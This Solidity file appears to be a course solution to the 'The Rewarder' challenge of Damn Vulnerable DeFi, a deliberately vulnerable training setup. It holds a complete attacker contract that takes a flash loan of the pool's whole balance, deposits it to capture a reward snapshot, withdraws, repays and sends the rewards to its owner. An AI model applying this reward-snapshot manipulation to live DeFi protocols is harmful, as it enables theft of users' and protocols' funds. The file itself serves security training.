// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "week10-11-security2/the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool} from "week10-11-security2/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "week10-11-security2/the-rewarder/RewardToken.sol";

contract TheRewarderAttacker {
    FlashLoanerPool flashLoan;
    TheRewarderPool rewarder;
    address owner;
    DamnValuableToken dvt;

    constructor(FlashLoanerPool flashLoan_, TheRewarderPool rewarder_) {
        flashLoan = flashLoan_;
        rewarder = rewarder_;
        owner = msg.sender;
        dvt = flashLoan.liquidityToken();
    }

    function attack() external {
        // Request flash-loan
        uint256 amount = dvt.balanceOf(address(flashLoan));
        flashLoan.flashLoan(amount);

        // The rest of the exploit is handled in the flash-loan receiver
    }

    function receiveFlashLoan(uint256 amount) external {
        // Deposit flash-loan with rewarder
        dvt.approve(address(rewarder), amount);
        rewarder.deposit(amount);

        // Trigger payout
        rewarder.distributeRewards();

        // Withdraw tokens
        rewarder.withdraw(amount);

        // Return flash-loan
        dvt.transfer(msg.sender, amount);

        // Transfer reward tokens to owner
        RewardToken rewardToken = rewarder.rewardToken();
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, rewardBalance);
    }
}
